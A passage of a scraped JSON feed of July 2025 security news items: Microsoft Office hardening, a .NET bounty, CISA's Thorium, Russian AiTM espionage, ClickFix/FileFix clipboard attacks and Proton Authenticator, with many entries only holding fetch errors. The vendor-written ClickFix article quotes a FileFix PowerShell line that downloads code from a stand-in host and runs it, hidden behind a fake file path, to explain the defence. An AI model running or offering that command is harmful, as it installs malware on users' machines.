        "Content": "Microsoft has announced that it will start disabling external workbook links to blocked file types by default between October 2025 and July 2026.\nAfter the rollout, Excel workbooks referencing blocked file types will display a #BLOCKED error or fail to refresh, eliminating security risks associated with accessing unsupported or high-risk file types, including, but not limited to, phishing attacks that utilize workbooks to redirect targets to malicious payloads.\nThis change is being introduced as a new FileBlockExternalLinks group policy, which expands File Block Settings to include external workbook links.\nAs the company explained in a\nMicrosoft 365 admin center message\non Wednesday, Microsoft 365 will display a business bar warning of this upcoming change when opening workbooks containing external links to blocked file types, starting with Build 2509.\nHowever, after updating to Build 2510, if the policy is unconfigured, users will no longer be able to refresh or create new references to blocked file types.\n\"If not configured, no changes will take effect immediately. However, starting October 2025, the default behavior will block external links to file types currently blocked by the Trust Center,\" the company said.\n\"We recommend reviewing existing workbooks and communicating this change to users who rely on external links to ensure continuity of workflows.\"\nMicrosoft 365 admins who want to re-enable refreshing external links to blocked file types can edit the HKCU\\Software\\Microsoft\\Office\\<version>\\Excel\\Security\\FileBlock\\FileBlockExternalLinks registry key using the detailed instructions\nin this support document\n.\nSince the start of the year, the company has also\nadded the .library-ms and .search-ms file types\nto the list of blocked Outlook attachments and started\nturning off all ActiveX controls\nin Windows versions of Microsoft 365 and Office 2024 applications.\nThese changes are part of a broader effort to remove or disable Office and Windows features that have been exploited to infect Microsoft users with malware.\nThis initiative began in 2018 when Microsoft\nexpanded support\nfor its Antimalware Scan Interface (AMSI) in Office 365 client apps, enabling the blocking of attacks that use Office VBA macros.\nSince then, the company has\nstarted blocking VBA Office macros\nby default, introduced\nXLM macro protection\n,\ndisabled Excel 4.0 (XLM) macros\n, announced that it would soon\nkill off VBScript\n, and begun\nblocking untrusted XLL add-ins by default\nacross Microsoft 365 tenants.\nEarlier today, Microsoft also announced that it\nhas increased bounty payouts\nto $40,000 for some .NET and ASP.NET Core vulnerabilities.\nCloud Detection & Response for Dummies\nContain emerging threats in real time - before they impact your business.\nLearn how cloud detection and response (CDR) gives security teams the edge they need in this practical, no-nonsense guide.\nGet the Guide\nRelated Articles:\nMicrosoft blocks ActiveX by default in Microsoft 365, Office 2024\nMicrosoft investigates outage affecting Microsoft 365 admin center\nMicrosoft 365 'Direct Send' abused to send phishing as internal users\nMicrosoft 365 to block file access via legacy auth protocols by default\nMicrosoft now pays up to $40,000 for some .NET vulnerabilities"
    },
    {
        "Title": "Microsoft now pays up to $40,000 for some .NET vulnerabilities",
        "Link": "https://www.bleepingcomputer.com/news/microsoft/microsoft-now-pays-up-to-40-000-for-some-net-vulnerabilities/",
        "Summary": "Microsoft has expanded its .NET bug bounty program and increased rewards to $40,000 for some .NET and ASP.NET Core vulnerabilities. [...]",
        "Date": "2025-07-31",
        "Content": "Microsoft has expanded its .NET bug bounty program and increased rewards to $40,000 for some .NET and ASP.NET Core vulnerabilities.\nMadeline Eckert, a senior program manager for Researcher Incentives and Bounty at Microsoft, stated that these changes aim to more accurately reflect the complexity involved in discovering and exploiting .NET vulnerabilities.\n\"We're excited to announce significant updates to the Microsoft .NET Bounty Program. These changes expand the program's scope, simplify the award structure, and offer great incentives for security researchers,\"\nsaid\nEckert.\n\"The .NET Bounty Program now offers awards up to $40,000 USD for vulnerabilities impacting the .NET and ASP.NET Core (including Blazor and Aspire).\"\nStarting today, Microsoft will pay up to $40,000 for critical remote code execution and privilege escalation security flaws, as well as $30,000 for critical security feature bypasses, and up to $20,000 for critical remote denial-of-service bugs.\nThe .NET bug bounty program has also expanded to better cover .NET framework vulnerabilities, and it now includes:\nAll supported versions of .NET and ASP.NET,\nAdjacent technologies such as F#,\nSupported versions of ASP.NET Core for .NET Framework,\nTemplates provided with supported versions of .NET and ASP.NET Core,\nGitHub Actions in the .NET and ASP.NET Core repositories.\n​Earlier this year, Microsoft\nraised bounty awards\nto $30,000 for AI vulnerabilities found in Power Platform and Dynamics 365 services and products.\nIn February, it\nannounced increased payouts\nfor moderate-severity Microsoft Copilot (AI) security flaws and a 100% award multiplier for all Copilot bounty awards to incentivize AI research.\nDuring last year's Ignite annual conference, Microsoft also\nlaunched the Zero Day Quest\n, a hacking event focusing on cloud and AI products and platforms, and offering $4 million in rewards.\nThese efforts are part of the company's\nSecure Future Initiative (SFI)\n, a company-wide cybersecurity engineering plan launched in November 2023, following a scathing report issued by the Department of Homeland Security's Cyber Safety Review Board, which\nstated\nthat Microsoft's \"security culture was inadequate and requires an overhaul.\"\nThe Board Report Deck CISOs Actually Use\nCISOs know that getting board buy-in starts with a clear, strategic view of how cloud security drives business value.\nThis free, editable board report deck helps security leaders present risk, impact, and priorities in clear business terms. Turn security updates into meaningful conversations and faster decision-making in the boardroom.\nDownload the template to get started today\nRelated Articles:\nWindows 10 KB5062554 cumulative update released with 13 changes, fixes\nMicrosoft July 2025 Patch Tuesday fixes one zero-day, 137 flaws\nMicrosoft June 2025 Patch Tuesday fixes exploited zero-day, 66 flaws\nMicrosoft to disable Excel workbook links to blocked file types\nLovense sex toy app flaw leaks private user email addresses"
    },
    {
        "Title": "CISA open-sources Thorium platform for malware, forensic analysis",
        "Link": "https://www.bleepingcomputer.com/news/security/cisa-open-sources-thorium-platform-for-malware-forensic-analysis/",
        "Summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) today announced the public availability of Thorium, an open-source platform for malware and forensic analysts across the government, public, and private sectors. [...]",
        "Date": "2025-07-31",
        "Content": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) today announced the public availability of Thorium, an open-source platform for malware and forensic analysts across the government, public, and private sectors.\nThorium\nwas developed\nin partnership with Sandia National Laboratories\nas a scalable cybersecurity suite that automates many tasks involved in cyberattack investigations, and can schedule over 1,700 jobs per second and ingest over 10 million files per hour per permission group.\n\"Thorium enhances cybersecurity teams' capabilities by automating analysis workflows through seamless integration of commercial, open-source, and custom tools,\"\nCISA said\non Thursday.\n\"It supports various mission functions, including software analysis, digital forensics, and incident response, allowing analysts to efficiently assess complex malware threats.\"\nSecurity teams can use Thorium for automating and speeding up various file analysis workflows, including but not limited to:\nEasily import and export tools to facilitate sharing across cyber defense teams,\nIntegrate command-line tools as Docker images, including open-source, commercial, and custom software,\nFilter results using tags and full-text search,\nControl access to submissions, tools, and results with strict group-based permissions,\nScale with Kubernetes and ScyllaDB to meet workload demands.\nDefenders can find installation instructions and get their own copy of Thorium from\nCISA's official GitHub repository\n.\n\"By publicly sharing this platform, we empower the broader cybersecurity community to orchestrate the use of advanced tools for malware and forensic analysis,\" added CISA Associate Director for Threat Hunting Jermaine Roebuck.\n\"Scalable analysis of binaries as well as other digital artifacts further enables cybersecurity analysts to understand and address vulnerabilities in benign software.\"\nOn Wednesday, CISA released the\nEviction Strategies Tool\n, which helps security teams during the incident response by providing the necessary actions to contain and evict adversaries from compromised networks and devices.\nLast year, the cyber defense agency also\nmade its \"Malware Next-Gen\" analysis system publicly available\n, allowing the public to submit malware samples for analysis by CISA.\nOne year earlier, CISA\nstarted offering free security scans\nfor critical infrastructure facilities to help protect them from hacker attacks.\nThe Board Report Deck CISOs Actually Use\nCISOs know that getting board buy-in starts with a clear, strategic view of how cloud security drives business value.\nThis free, editable board report deck helps security leaders present risk, impact, and priorities in clear business terms. Turn security updates into meaningful conversations and faster decision-making in the boardroom.\nDownload the template to get started today\nRelated Articles:\nNorth Korean XORIndex malware hidden in 67 malicious npm packages\nInside a Real Clickfix Attack: How This Social Engineering Hack Unfolds\nHackers exploit SAP NetWeaver bug to deploy Linux Auto-Color malware\nEndgame Gear mouse config tool infected users with malware\nCISA flags PaperCut RCE bug as exploited in attacks, patch now"
    },
    {
        "Title": "Microsoft: Russian hackers use ISP access to hack embassies in AiTM attacks",
        "Link": "https://www.bleepingcomputer.com/news/security/microsoft-russian-hackers-use-isp-access-to-hack-embassies-in-aitm-attacks/",
        "Summary": "Microsoft warns that a cyber-espionage group linked to Russia's Federal Security Service (FSB) is targeting diplomatic missions in Moscow using local internet service providers. [...]",
        "Date": "2025-07-31",
        "Content": "Microsoft warns that a cyber-espionage group linked to Russia's Federal Security Service (FSB) is targeting diplomatic missions in Moscow using local internet service providers.\nThe hacking group tracked by Microsoft as Secret Blizzard (also known as Turla, Waterbug, and Venomous Bear) has been observed exploiting its adversary-in-the-middle (AiTM) position at the internet service provider (ISP) level to infect the systems of diplomatic missions with custom ApolloShadow malware.\nTo do this, they redirect targets to captive portals, tricking them into downloading and executing a malware payload disguised as a Kaspersky antivirus installer.\nOnce deployed, ApolloShadow installs a trusted root certificate disguised as Kaspersky Anti-Virus, which helps trick compromised devices into recognizing malicious websites as legitimate, allowing threat actors to maintain long-term access for intelligence gathering after infiltrating diplomatic systems.\n\"This is the first time Microsoft can confirm Secret Blizzard's capability to conduct espionage at the ISP level, meaning diplomatic personnel using local internet providers and telecommunications in Russia are at high risk of being targets of Secret Blizzard's AiTM position within those services,\" Microsoft said.\n\"This campaign, which has been ongoing since at least 2024, poses a high risk to foreign embassies, diplomatic entities, and other sensitive organizations operating in Moscow, particularly to those entities who rely on local internet providers.\"\nWhile Microsoft first detected the attacks in February 2025, the company believes this cyber-espionage campaign has been active since at least 2024.\nSecret Blizzard infection chain (Microsoft)\nSecret Blizzard hackers are also\ntaking advantage of Russia's domestic interception systems\n, including the System for Operative Investigative Activities (SORM), to carry out their large-scale AiTM campaigns.\n​Unorthodox cyberspies focused on high-profile targets\nTurla has been orchestrating cyber-espionage and information theft campaigns targeting embassies, governments, and research facilities across over 100 countries since at least 1996.\nTwo years ago, CISA\nlinked\nthe group to Center 16 of Russia's Federal Security Service (FSB) and a peer-to-peer (P2P) network of computers infected with Snake cyber-espionage malware that was later\ntaken down\nin a joint action involving Five Eyes cybersecurity and intelligence agencies.\nThese Russian state-backed hackers are also the primary suspects behind attacks targeting the\nU.S. Central Command\n,\nNASA\n,\nthe Pentagon\n, multiple\nEastern European Ministries of Foreign Affairs\n, the\nFinnish Foreign Ministry\n, and\nEU governments and embassies\n.\nThis threat group is known for its unconventional tactics, including the control of malware through\ncomments on Britney Spears' Instagram photos\nand the use of\nbackdoor trojans with their own APIs\n.\nTurla also utilized the\nhijacked infrastructure and malware of the Iranian APT OilRig\nin their own campaigns to mislead and deceive defenders into attributing their attacks to Iranian state hackers.\nMost recently, they've also been spotted hijacking the infrastructure of\nPakistani threat actor Storm-0156\nto target Ukrainian military devices connected via Starlink.\nThe Board Report Deck CISOs Actually Use\nCISOs know that getting board buy-in starts with a clear, strategic view of how cloud security drives business value.\nThis free, editable board report deck helps security leaders present risk, impact, and priorities in clear business terms. Turn security updates into meaningful conversations and faster decision-making in the boardroom.\nDownload the template to get started today\nRelated Articles:\nRussian airline Aeroflot grounds dozens of flights after cyberattack\nRussian alcohol retailer WineLab closes stores after ransomware attack\nUK ties GRU to stealthy Microsoft 365 credential-stealing malware\nEuropol disrupts pro-Russian NoName057(16) DDoS hacktivist group\n'Batavia' Windows spyware campaign targets dozens of Russian orgs"
    },
    {
        "Title": "Inside a Real Clickfix Attack: How This Social Engineering Hack Unfolds",
        "Link": "https://www.bleepingcomputer.com/news/security/inside-a-real-clickfix-attack-how-this-social-engineering-hack-unfolds/",
        "Summary": "ClickFix abuses clipboards. FileFix hijacks File Explorer. Both social engineering attacks start in the browser—and end in malware. See how Keep Aware stops these stealthy attacks before they break out of the browser in a run down of a real attack. [...]",
        "Date": "2025-07-31",
        "Content": "An inside look at a ClickFix campaign and a real-world attack, its next iteration (FileFix), and how to prevent it in its tracks, before device compromise.\nClickFix: Silent Copying to Clipboard\nClickFix, a deceptive social engineering tactic, is used by threat actors to manipulate unsuspecting users into unwittingly allowing a web page to silently populate the clipboard.\nUltimately, the attacker is attempting to get a user to (unknowingly) execute malicious code, gathered from the browser and quietly placed into the user’s clipboard, on the host machine.\nCoined initially as “ClickFix” because the social engineering prompts were telling the user they ought to “fix” a problem with their browser and required the user to click an element, this term is now ascribed to any similar attack, one in which a user clicks an element, the page then populates the victim’s clipboard, and it instructs the user to paste the malicious code into their device’s terminal.\nImages of a ClickFix attack disguised as a CAPTCHA prompt.\nThe above screenshots show an example ClickFix attack. Once the user clicks the fake CAPTCHA, the page silently populates the user’s clipboard with malicious code. It then displays instructions for the user to prove they are human—by pasting (the malicious code) into the Windows Run dialog.\nFor more information about ClickFix, see our article explaining\nthe what, why, where, and how of ClickFix\n.\nStop ClickFix Attacks Where They Start: In the Browser\nKeep Aware, the purpose-built browser security platform, detects deceptive interactions in real time, right where they happen.\nBy monitoring clipboard access patterns, flagging suspicious web pages, and disrupting lateral movement techniques like ClickFix, Keep Aware empowers organizations to shut down attacks before they ever leave the browser and reach the host.\nRequest a Demo\nReal-World Attack: Google Result to ClickFix Attempt\nA Keep Aware customer recently encountered a ClickFix attack in the wild. While browsing search engine results, the user clicked on a compromised site. This site, injected with malicious JavaScript, delivered a ClickFix prompt, ultimately for the goal of deploying the NetSupportManager RAT backdoor.\nThe user had clicked on the prompt, allowing the page to populate the clipboard (with malicious PowerShell), and instructing the user to paste into the device’s terminal.\nHowever, Keep Aware identified, blocked, and warned the user of the suspicious commands the page attempted to populate the clipboard with, effectively preventing device compromise.\nThe video below walks through what visitors experience on this compromised site—a fake CAPTCHA verification frame. Upon clicking the fake CAPTCHA, malicious JavaScript updates the user’s clipboard with malicious PowerShell code and prompts the user to paste it into the Windows Run dialog.\nBelow is a walkthrough of what would have happened if Keep Aware’s safeguards were not in place to limit the user’s actions and clear the user’s clipboard.\nIf the social engineering tactic had been successful and no technical controls had been in place, the user would have unknowingly executed malicious PowerShell code.\nThis kicks of a series of downloads, de-obfuscation, assembling malware on the host machine, and setting up persistence in the user’s Run registry key—enabling the malware to persist on the compromised device and run each time the user logs in to their computer account.\nFor specific details about this real-world attack, including both the initial download cradle and the subsequent PowerShell code, check out our\nstep-by-step walkthrough\n.\nImpact: RATs, Stealers, and More\nClickFix attacks use malicious JavaScript, clipboard manipulation, and social engineering to ultimately gain the attacker access from the browser to the host device.\nIt has been seen on both malicious and compromised web pages and has been used by multiple threat groups to gain access to victim machines, ultimately deploying malware and remote access trojans (RATs), including AsyncRAT, Skuld Stealer, Lumma Stealer, DarkGate malware, DanaBot stealer, and more.\nWhen left undeterred by technical defenses, these seemingly simple clipboard attacks can escalate into full-system compromise, giving threat actors remote control, access to sensitive data, and persistent footholds that are difficult to detect and even harder to remove.\nThe Next Gen: FileFix\nFileFix is the next iteration, the younger sibling, of ClickFix—another clipboard-manipulation attack designed to trick users into executing code outside the browser context. First documented by security researcher mr.d0x in late June this year, FileFix dupes users into pasting commands directly into File Explorer’s address bar, and threat actors are already adopting this newer technique.\nAt a glance, the pasted output looks harmless, like a standard Windows file path. But hidden at the start is a malicious command; the \"file path\" that follows is a comment, disguising the real threat.\nPowershell.exe -c \"iwr malicious[.]site/mal.jpg|iex\" #                                                                                          C:\\Organization\\Internal\\Drive\\Business-RFP.pdf\nThe full data copied to the user’s clipboard is a malicious PowerShell command ending in a comment containing a file path.\nNotice in the image below, how the seemingly harmless file path in the Explorer’s address bar does not show the actual PowerShell is hidden from the user’s view.\nFile Explorer, opened by a Chrome tab.\nLike ClickFix, the FileFix attack originates in the browser and relies on social engineering, clipboard injection, and user action to cross the boundary between browser and host. FileFix is, at its core, a ClickFix attack specific to using File Explorer.\nBoth happen in the browser context.\nBoth use the same clipboard population technique.\nBoth leverage malicious and compromised websites, blurring the line between trusted and malicious web traffic.\nBoth lead to attacker access on the host device.\nThis means that FileFix can be stopped the same way ClickFix is: with browser-native defenses. Browser security solutions, like Keep Aware, detect clipboard population attempts in real-time and intercept suspicious code before it ever reaches the host device. This is why having policies built into the browser ensures that compromises are kept at bay.\nBrowser Security Takes the Main Stage\nClickFix and FileFix attacks reveal a critical blind spot in many security strategies: the browser as a vector for host compromise. These clipboard-based techniques use social engineering and abuse the user's interaction with seemingly legitimate, or even compromised, websites to deliver malicious code.\nWithout visibility into browser activity or control over clipboard access, traditional defenses miss the early signs. But with browser-native insight and real-time clipboard protection, organizations can intercept these attacks at their source, before any code is executed on the host.\nAt Keep Aware, we’ve seen firsthand how traditional security tools fall short when it comes to protecting the browser—the primary interface employees rely on and attackers exploit. That’s why we built our platform: to detect and block clipboard manipulation and other browser-based attacks before they can cause real harm.\nInterested in learning more? Feel free to\nrequest a demo here.\nAdditionally, we’re proud to be named one of just\nfour\nBlack Hat USA 2025 Startup Spotlight Finalists\nfor innovation, and we remain committed to redefining how organizations secure and manage the browser—the place where today’s work begins, and where today’s attacks often start.\nIf you’ll be attending Black Hat USA 2025 next week, watch us take the stage to make our pitch, stop by the Keep Aware booth, or\nschedule time to chat with the team\nat the event.\nSponsored and written by\nKeep Aware\n."
    },
    {
        "Title": "Spikes in malicious activity precede new security flaws in 80% of cases",
        "Link": "https://www.bleepingcomputer.com/news/security/spikes-in-malicious-activity-precede-new-cves-in-80-percent-of-cases/",
        "Summary": "Researchers have found that in roughly 80% of cases, spikes in malicious activity like network reconnaissance, targeted scanning, and brute-forcing attempts targeting edge networking devices are a precursor to the disclosure of new security vulnerabilities (CVEs) within six weeks. [...]",
        "Date": "2025-07-31",
        "Content": "Researchers have found that in roughly 80% of cases, spikes in malicious activity like network reconnaissance, targeted scanning, and brute-forcing attempts targeting edge networking devices are a precursor to the disclosure of new security vulnerabilities (CVEs) within six weeks.\nThis has been discovered by threat monitoring firm GreyNoise, which reports these occurrences are not random, but are rather characterized by repeatable and statistically significant patterns.\nGreyNoise bases this on data from its 'Global Observation Grid' (GOG) collected since September 2024, applying objective statistical thresholds to avoid results-skewing cherry-picking.\nAfter removing noisy, ambiguous, and low-quality data, the firm ended up with 216 events that qualified as spike events, tied to eight enterprise edge vendors.\n\"Across all 216 spike events we studied, 50 percent were followed by a new CVE within three weeks, and 80 percent within six weeks,\"\nexplain the researchers\n.\nThe correlation was notably stronger for Ivanti, SonicWall, Palo Alto Networks, and Fortinet products, and weaker for MikroTik, Citrix, and Cisco. State-sponsored actors have repeatedly targeted such systems for initial access and persistence.\nSpike activity and time of disclosure of new CVEs\nSource: GreyNoise\nGreyNoise notes that in the majority of the cases underlying these\nspikes\n, the attackers perform exploit attempts against older, known flaws.\nThe researchers believe that this either facilitates the discovery of new weaknesses or the discovery of internet-exposed endpoints that can be targeted in the next phase of the attack, which leverages novel exploits.\nA \"Mine Canary\"\nTraditionally, defenders respond after a CVE is published, but GreyNoise's findings show that attacker behavior can be a leading indicator and a tool for organizing proactive defenses.\nThese pre-disclosure spikes give defenders a window to prepare, enhance monitoring, and harden systems against a potential attack, even if a security update does not protect them and they aren't aware of which system component or function is actually targeted.\nGreyNoise recommends that scanning activity be closely monitored and origin IPs promptly blocked, as this excludes them from reconnaissance that typically leads to actual attacks later on.\nThe researchers underline that scans for older flaws are to be expected in these cases, as attackers aim to catalog exposed assets. Hence, those shouldn't be disregarded as failed attempts to breach fully-patched endpoints.\nActivity spikes (white) and publication of new CVEs (red)\nSource: GreyNoise\nOn a related development, Google's\nProject Zero announced\nthat it will begin informing the public that a vulnerability has been discovered within a week, helping system admins bolster their defenses while vendors work on developing a patch.\nProject Zero will now share the vendor/project and product impacted by the new flaw, the discovery time, and disclosure deadline (still at 90 days).\nLacking technical details, proof-of-concept exploits, or any other information that could tip attackers, Google expects this change to have no adverse effect on security while at the same time helping reduce the \"patch gap.\"\nCloud Detection & Response for Dummies\nContain emerging threats in real time - before they impact your business.\nLearn how cloud detection and response (CDR) gives security teams the edge they need in this practical, no-nonsense guide.\nGet the Guide\nRelated Articles:\nHackers actively exploit critical RCE in WordPress Alone theme\nApple patches security flaw exploited in Chrome zero-day attacks\nHackers exploit SAP NetWeaver bug to deploy Linux Auto-Color malware\nExploit available for critical Cisco ISE bug exploited in attacks\nCisco: Maximum-severity ISE RCE flaws now exploited in attacks"
    },
    {
        "Title": "Proton launches free standalone cross-platform Authenticator app",
        "Link": "https://www.bleepingcomputer.com/news/security/proton-launches-free-standalone-cross-platform-authenticator-app/",
        "Summary": "Proton has launched Proton Authenticator, a free standalone two-factor authentication (2FA) application for Windows, macOS, Linux, Android, and iOS. [...]",
        "Date": "2025-07-31",
        "Content": "Proton has launched Proton Authenticator, a free standalone two-factor authentication (2FA) application for Windows, macOS, Linux, Android, and iOS.\n2FA authenticator apps are offline tools that generate time-based one-time passwords (TOTPs) that expire every 30 seconds, and which can be used alongside passwords when logging into online accounts, providing the second factor authentication.\nProton is a Swiss technology company known for privacy-focused end-to-end encrypted services like\nProton Mail\n(email),\nProton VPN\n,\nProton Drive\n(cloud storage), and\nProton Pass\n(password manager).\nThe introduction of an Authenticator app complements the company's product portfolio and introduces a privacy-focused tool that stands out against competition that is largely closed-source, ad-supported, and locks users into proprietary ecosystems.\nInstead, Proton Authenticator uses no ads, trackers, or vendor lock-in, and requires no Proton account.\n\"Proton Authenticator is built with the same values that power everything Proton does: privacy, transparency, and user-first security,\"\nreads the product launch announcement\n.\n\"The company is now bringing these standards to the 2FA space – offering a secure, easy-to-use, and encrypted alternative to apps like Google Authenticator that further lock users into Big Tech's surveillance ecosystems.\"\nComparison table\nSource: Proton\nThe team stated that the app is also open-source, but it typically takes Proton a couple of weeks to release the source code of newly launched tools on GitHub, so we cannot confirm that yet.\nProton Authenticator is built with end-to-end encryption, supporting secure cross-device syncing and migration to or from other platforms through easy-to-use import and export functions.\nThe ability to export your TOTP seeds is a feature sorely missing from other popular auth apps like Microsoft Authenticator and Authy.\nThe new tool also offers automatic encrypted backups and app locking with biometrics or a PIN, adding an extra layer of security.\nAuthenticator apps are significantly more secure than SMS or email-based 2FA because they generate codes locally on the users' devices. At the same time, the time-based tokens expire quickly, making them useless after a while, even if stolen.\nThey are nearly immune to phishing, SIM swapping, and man-in-the-middle attacks, as there's no intermediary that can be intercepted or impersonated.\nHence, if you're not already using one, it is recommended that you set one up for all accounts that support 2FA protection.\nThe Board Report Deck CISOs Actually Use\nCISOs know that getting board buy-in starts with a clear, strategic view of how cloud security drives business value.\nThis free, editable board report deck helps security leaders present risk, impact, and priorities in clear business terms. Turn security updates into meaningful conversations and faster decision-making in the boardroom.\nDownload the template to get started today\nRelated Articles:\nProton launches privacy-respecting encrypted AI assistant Lumo\nHackers scanning for TeleMessage Signal clone flaw exposing passwords\nHackers abuse leaked Shellter red team tool to deploy infostealers\nCloudflare open-sources Orange Meets with End-to-End encryption\nDoubling down: How Universal 2nd Factor (U2F) boosts online security"
    },
    {
        "Title": "Gen Z Falls for Scams 2x More Than Older Generations",
        "Link": "https://www.darkreading.com/cyber-risk/gen-z-scams-2x-more-older-generations",
        "Summary": "Forget gullible old people  — Gen Z is the most at-risk age group on the Web. Older folks might want to ignore it, but employers are likely to feel the brunt.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/cyber-risk/gen-z-scams-2x-more-older-generations"
    },
    {
        "Title": "DragonForce Ransom Cartel Profits Off Rivals' Demise",
        "Link": "https://www.darkreading.com/threat-intelligence/dragonforce-ransom-cartel-profits-rivals-demise",
        "Summary": "The fall of RansomHub led to a major consolidation of the ransomware ecosystem last quarter, which was a boon for the DragonForce and Qilin gangs.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/threat-intelligence/dragonforce-ransom-cartel-profits-rivals-demise"
    },
    {
        "Title": "SafePay Claims Ingram Micro Breach, Sets Ransom Deadline",
        "Link": "https://www.darkreading.com/cyberattacks-data-breaches/safepay-ingram-micro-breach-ransom-deadline",
        "Summary": "The ransomware gang claims to have stolen 3.5TB of data, and told the technology distributor to pay up or suffer a data breach.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/cyberattacks-data-breaches/safepay-ingram-micro-breach-ransom-deadline"
    },
    {
        "Title": "3 Things CFOs Need to Know About Mitigating Threats",
        "Link": "https://www.darkreading.com/vulnerabilities-threats/3-things-cfo-mitigating-threats",
        "Summary": "To reposition cybersecurity as a strategic, business-critical investment, CFOs and CISOs play a critical role in articulating the significant ROI that robust security measures can deliver.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/vulnerabilities-threats/3-things-cfo-mitigating-threats"
    },
    {
        "Title": "Russia's Secret Blizzard APT Gains Embassy Access via ISPs",
        "Link": "https://www.darkreading.com/threat-intelligence/russia-secret-blizzard-apt-embassy-isps",
        "Summary": "An ongoing AitM campaign by the infamous Moscow-sponsored cyber-threat actor has widened its scope, dropping the dangerous ApolloShadow custom backdoor malware thanks to lawful intercept systems.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/threat-intelligence/russia-secret-blizzard-apt-embassy-isps"
    },
    {
        "Title": "Getting a Cybersecurity Vibe Check on Vibe Coding",
        "Link": "https://www.darkreading.com/application-security/cybersecurity-vibe-check-vibe-coding",
        "Summary": "Following a number of high-profile security and development issues surrounding the use of LLMs and GenAI to code and create applications, it's worth taking a temperature check to ask: Is this technology ready for prime time?",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/application-security/cybersecurity-vibe-check-vibe-coding"
    },
    {
        "Title": "What the Coinbase Breach Says About Insider Risk",
        "Link": "https://www.darkreading.com/vulnerabilities-threats/coinbase-breach-insider-risk",
        "Summary": "The lesson from the breach is not just about what went wrong — but what could have gone right.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/vulnerabilities-threats/coinbase-breach-insider-risk"
    },
    {
        "Title": "Dark Reading Confidential: Funding the CVE Program of the Future",
        "Link": "https://www.darkreading.com/cybersecurity-operations/funding-cve-program-future",
        "Summary": "Dark Reading Confidential Episode 8: Federal funding for the CVE Program expires in April 2026, and a trio of experts agree the industry isn't doing enough to deal with the looming crisis. Bugcrowd's Trey Ford, expert Adam Shostack, and vulnerability historian Brian Martin sit down with Dark Reading to help us figure out what a &quot;good&quot; future of the CVE Program would look like and how to get there.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/cybersecurity-operations/funding-cve-program-future"
    },
    {
        "Title": "Low-Code Tools in Microsoft Azure Allowed Unprivileged Access",
        "Link": "https://www.darkreading.com/vulnerabilities-threats/low-code-tools-azure-allowed-unprivileged-access",
        "Summary": "Using the API Connections for Azure Logic Apps, a security researcher found unauthenticated users could access sensitive data of other customers.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/vulnerabilities-threats/low-code-tools-azure-allowed-unprivileged-access"
    },
    {
        "Title": "Koreans Hacked, Blackmailed by 250+ Fake Mobile Apps",
        "Link": "https://www.darkreading.com/threat-intelligence/koreans-hacked-blackmailed-250-fake-mobile-apps",
        "Summary": "A swath of copycat Korean apps are hiding spyware, occasionally leading to highly personal, disturbing extortions.",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.darkreading.com/threat-intelligence/koreans-hacked-blackmailed-250-fake-mobile-apps"
    },
    {
        "Title": "Noma Security Raises $100 Million for AI Security Platform",
        "Link": "https://www.securityweek.com/noma-security-raises-100-million-for-ai-security-platform/",
        "Summary": "<p>Noma Security has announced a Series B funding round that will enable the company’s growth and expansion of its AI agent security solutions. </p>\n<p>The post <a href=\"https://www.securityweek.com/noma-security-raises-100-million-for-ai-security-platform/\">Noma Security Raises $100 Million for AI Security Platform</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/noma-security-raises-100-million-for-ai-security-platform/"
    },
    {
        "Title": "Chinese Researchers Suggest Lasers and Sabotage to Counter Musk’s Starlink Satellites",
        "Link": "https://www.securityweek.com/chinese-researchers-suggest-lasers-and-sabotage-to-counter-musks-starlink-satellites/",
        "Summary": "<p>Chinese military and cyber researchers are intensifying efforts to counter Elon Musk’s Starlink satellite network, viewing it as a potential tool for U.S. military power across nuclear, space, and cyber domains. </p>\n<p>The post <a href=\"https://www.securityweek.com/chinese-researchers-suggest-lasers-and-sabotage-to-counter-musks-starlink-satellites/\">Chinese Researchers Suggest Lasers and Sabotage to Counter Musk’s Starlink Satellites</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/chinese-researchers-suggest-lasers-and-sabotage-to-counter-musks-starlink-satellites/"
    },
    {
        "Title": "Reach Security Raises $10 Million for Exposure Management Solution",
        "Link": "https://www.securityweek.com/reach-security-raises-10-million-for-exposure-management-solution/",
        "Summary": "<p>Reach Security has received a $10 million strategic investment from M12 to advance its domain-specific AI approach for exposure management.</p>\n<p>The post <a href=\"https://www.securityweek.com/reach-security-raises-10-million-for-exposure-management-solution/\">Reach Security Raises $10 Million for Exposure Management Solution</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
        "Content": "Error fetching article: 403 Client Error: Forbidden for url: https://www.securityweek.com/reach-security-raises-10-million-for-exposure-management-solution/"
    },
    {
        "Title": "Open Source CISA Tool Helps Defenders With Hacker Containment, Eviction",
        "Link": "https://www.securityweek.com/open-source-cisa-tool-helps-defenders-with-hacker-containment-eviction/",
        "Summary": "<p>The tool includes resources to help organizations during the containment and eviction stages of incident response.</p>\n<p>The post <a href=\"https://www.securityweek.com/open-source-cisa-tool-helps-defenders-with-hacker-containment-eviction/\">Open Source CISA Tool Helps Defenders With Hacker Containment, Eviction</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-07-31",
